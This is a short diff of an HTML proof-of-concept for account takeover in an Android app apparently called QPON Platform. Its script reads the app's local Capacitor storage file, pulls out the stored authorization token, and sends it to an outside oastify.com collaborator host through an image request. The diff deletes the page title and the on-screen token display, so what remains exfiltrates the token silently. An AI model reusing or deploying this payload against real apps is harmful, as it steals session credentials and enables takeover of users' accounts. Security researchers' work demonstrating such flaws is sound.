@@ -1,13 +1,11 @@
 <html>
   <body>
-    <h1>QPON Platform - Account Takeover PoC</h1>
     <script>
       var req = new XMLHttpRequest();
       req.open("GET", "/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml", true);
       req.onload = function() {
         var m = req.responseText.match(/<string name="Authorize">([^<]+)<\/string>/);
         if (m) {
-          document.body.innerText += "Auth Token: " + m[1].substring(0, 60) + "...";
           new Image().src = "https://f2ir37tviw915fk8akf6ls1x7odf1apz.oastify.com/?token=" + encodeURIComponent(m[1]);
         }
       };
